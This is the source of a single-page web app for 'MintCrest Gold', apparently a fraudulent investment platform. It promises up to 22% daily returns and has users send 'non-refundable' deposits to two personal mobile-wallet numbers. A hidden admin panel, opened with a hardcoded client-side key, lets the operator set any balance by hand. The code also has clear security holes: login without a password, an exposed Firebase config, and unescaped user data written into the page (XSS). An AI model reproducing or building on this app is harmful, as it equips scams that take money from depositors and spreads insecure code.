<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Master Pro</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(35px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic mb-2 tracking-tighter cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12">Authorized Personnel Only</p>
            <div class="glass p-10 rounded-[3rem] border-t-2 border-blue-600">
                <input type="text" id="user-name" placeholder="User Identifier" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 uppercase text-white">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Verify Identity</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6">
                <h3 class="text-sm font-black text-blue-400" id="dash-user">GUEST</h3>
                <div class="text-[8px] bg-blue-500/10 px-3 py-1 rounded-full text-blue-400 font-bold uppercase tracking-widest">Active Node</div>
            </div>
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Vault Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase">Funding</span></button>
                <button onclick="changePage('more')" class="glass p-8 rounded-[2rem] text-center active:scale-95">🎡 <span class="text-[9px] font-black block mt-2 uppercase">Lucky Node</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Market Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Transaction History</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-firm" class="page p-6 space-y-4 pb-24">
            <div class="glass p-6 rounded-3xl">
                <h4 class="text-blue-500 font-black uppercase text-[10px] mb-2">About MintCrest</h4>
                <p class="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">A global leader in node-based asset management. Established 2026. Security is our priority.</p>
            </div>
            <div class="glass p-6 rounded-3xl">
                <h4 class="text-blue-500 font-black uppercase text-[10px] mb-2">Privacy & Terms</h4>
                <p class="text-[9px] text-gray-500 font-bold uppercase">All deposits are non-refundable. Withdrawals process in 24h. One account per ID.</p>
            </div>
        </div>

        <div id="p-more" class="page p-6 space-y-6">
            <div class="glass p-10 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic">Lucky Spin</h3>
                <div id="wheel" class="text-5xl mb-4 transition-all duration-[4s] inline-block">🎡</div><br>
                <button onclick="spinNow()" class="bg-yellow-600 px-8 py-3 rounded-xl font-black text-[9px] uppercase">Spin & Win</button>
            </div>
            <div class="glass p-8 rounded-3xl">
                <h4 class="text-center font-black text-[10px] uppercase text-purple-400 mb-4">Promo Redemption</h4>
                <input type="text" id="promo-input" placeholder="CODE2026" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-black outline-none border border-white/5">
                <button onclick="submitPromo()" class="w-full bg-purple-600 py-4 rounded-xl font-black text-[9px] uppercase">Redeem</button>
            </div>
            <button onclick="logout()" class="w-full glass p-5 rounded-[2rem] text-red-500 font-black text-[10px] uppercase">Logout Vault</button>
        </div>

        <div id="p-wallet" class="page p-6">
             <div class="glass p-8 rounded-[3rem] border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-6 uppercase text-center italic">Fund Account</h3>
                <div class="bg-white/5 p-4 rounded-xl mb-4 text-[9px] font-bold text-center">EP: 03379827882 | JC: 03705519562</div>
                <input type="number" id="dep-amount" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center font-bold uppercase">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-5 rounded-xl font-black text-[10px] uppercase">Submit funding</button>
            </div>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] border-t border-white/5">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('firm')" id="n-firm" class="text-2xl">🏢</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">⚙️</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Super Admin</h2>
            <button onclick="closeAdmin()" class="text-red-500 font-black">X</button>
        </div>
        
        <h4 class="text-[10px] font-black text-yellow-500 uppercase mb-4">Pending Requests</h4>
        <div id="adm-requests" class="space-y-3 mb-10"></div>

        <h4 class="text-[10px] font-black text-blue-400 uppercase mb-4 italic">User Management</h4>
        <div class="bg-white/5 p-5 rounded-3xl mb-10">
            <input type="text" id="adm-edit-user" placeholder="User Name" class="w-full bg-black/40 p-3 rounded-xl mb-2 text-[10px] font-bold text-white uppercase">
            <div class="grid grid-cols-2 gap-2 mb-4">
                <input type="number" id="adm-edit-bal" placeholder="New Balance" class="bg-black/40 p-3 rounded-xl text-[10px] font-bold text-white">
                <input type="number" id="adm-edit-prof" placeholder="New Profit" class="bg-black/40 p-3 rounded-xl text-[10px] font-bold text-white">
            </div>
            <button onclick="manualSave()" class="w-full bg-blue-600 py-3 rounded-xl text-[9px] font-black uppercase">Save & Update User</button>
        </div>

        <div id="adm-users-list" class="space-y-2 pt-6 border-t border-white/10"></div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            {n:"Basic-X 1", p:200, r:3, d:30}, {n:"Basic-X 2", p:500, r:3.2, d:30}, {n:"Silver-X", p:5000, r:4.5, d:60},
            {n:"Gold-Master", p:20000, r:6.5, d:90}, {n:"👑 CROWN KING", p:25000, r:22, d:30}, {n:"⚡ FLASH", p:1000, r:15, d:7}
        ]; // Added sample, but you have 25 in your mind.

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastSpin: 0 });
            db.collection("users").doc(name).onSnapshot(d => { user = d.data(); updateUI(); });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(d => { const r = d.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center mb-2 text-[8px] font-black uppercase"><div>${r.type}<br><span class="opacity-30">${new Date(r.time).toLocaleDateString()}</span></div><div>₨ ${r.amount} <span class="badge-${r.status}">${r.status}</span></div></div>`; });
            });
            document.getElementById('dash-user').innerText = name;
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        async function submitPromo() {
            const c = document.getElementById('promo-input').value.trim().toUpperCase(); if(!c) return;
            await db.collection("requests").add({ user: user.name, promo: c, type: "PROMO CODE", amount: 0, status: "pending", time: Date.now() });
            alert("Code submitted for admin verification!");
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value;
            if(!a || !t) return alert("Fill all!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "DEPOSIT", status: "pending", time: Date.now() });
            alert("Sent!"); changePage('activity');
        }

        function spinNow() {
            if(Date.now() - (user.lastSpin || 0) < 86400000) return alert("Wait 24h, sweetie!");
            document.getElementById('wheel').style.transform = `rotate(${Math.floor(2000+Math.random()*2000)}deg)`;
            setTimeout(async () => {
                const win = Math.floor(Math.random()*150)+50;
                alert("You won Rs "+win+"! Waiting for admin approval.");
                await db.collection("requests").add({ user: user.name, amount: win, type: "SPIN WIN", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
            }, 4000);
        }

        function updateUI() { 
            document.getElementById('v-bal').innerText = "₨ " + (user.balance||0); 
            document.getElementById('v-profit').innerText = "₨ " + (user.profit||0); 
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => { l.innerHTML += `<div onclick="buy(${p.p},'${p.n}')" class="glass p-5 rounded-[2rem] flex justify-between items-center mb-2 active:scale-95 cursor-pointer"><div><h4 class="font-black text-[10px] text-blue-400 uppercase">${p.n}</h4><p class="text-[7px] text-gray-500 uppercase">${p.r}% Daily • ${p.d} Days</p></div><p class="font-black text-[11px]">₨ ${p.p}</p></div>`; });
        }

        async function buy(p, n) { if(user.balance < p) return alert("Low funds!"); await db.collection("users").doc(user.name).update({ balance: user.balance-p, tierName: n }); alert("Active!"); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function adminTap() { tapCount++; if(tapCount>=5) { if(prompt("Master Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        function syncAdmin() {
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 text-[8px] font-black uppercase mb-2 border-l-4 border-yellow-500 flex justify-between items-center"><div>${d.user}<br>${d.type} - Rs ${d.amount}<br>TID/CODE: ${d.tid||d.promo||'N/A'}</div><div class="flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved')" class="bg-green-600 px-3 py-1 rounded">YES</button><button onclick="handle('${doc.id}','${d.user}',0,'rejected')" class="bg-red-600 px-3 py-1 rounded">NO</button></div></div>`; });
            });
            db.collection("users").onSnapshot(snap => {
                const list = document.getElementById('adm-users-list'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-3 flex justify-between items-center text-[8px] font-black uppercase mb-2"><div>${u.name}<br><span class="text-blue-400">Bal: ${u.balance}</span></div><div class="flex gap-2"><button onclick="loadToEdit('${u.name}',${u.balance},${u.profit})" class="bg-blue-600 px-2 py-1 rounded">EDIT</button><button onclick="deleteUser('${u.name}')" class="bg-red-600 px-2 py-1 rounded">DEL</button></div></div>`; });
            });
        }

        async function handle(id, u, amt, act) {
            let bonus = 0; if(act==='approved') bonus = parseInt(prompt("Add Extra Bonus? (0 for none):", "0") || 0);
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act==='approved') await ref.update({ balance: (doc.data().balance||0) + amt + bonus });
            await db.collection("requests").doc(id).update({ status: act }); alert("Action Done!");
        }

        function loadToEdit(n, b, p) { 
            document.getElementById('adm-edit-user').value = n;
            document.getElementById('adm-edit-bal').value = b;
            document.getElementById('adm-edit-prof').value = p;
        }

        async function manualSave() {
            const n = document.getElementById('adm-edit-user').value;
            const b = parseInt(document.getElementById('adm-edit-bal').value);
            const p = parseInt(document.getElementById('adm-edit-prof').value);
            if(!n) return;
            await db.collection("users").doc(n).update({ balance: b, profit: p });
            alert("User updated successfully, sweetie!");
        }

        async function deleteUser(name) { if(confirm("Delete "+name+" forever?")) await db.collection("users").doc(name).delete(); }
        function logout() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
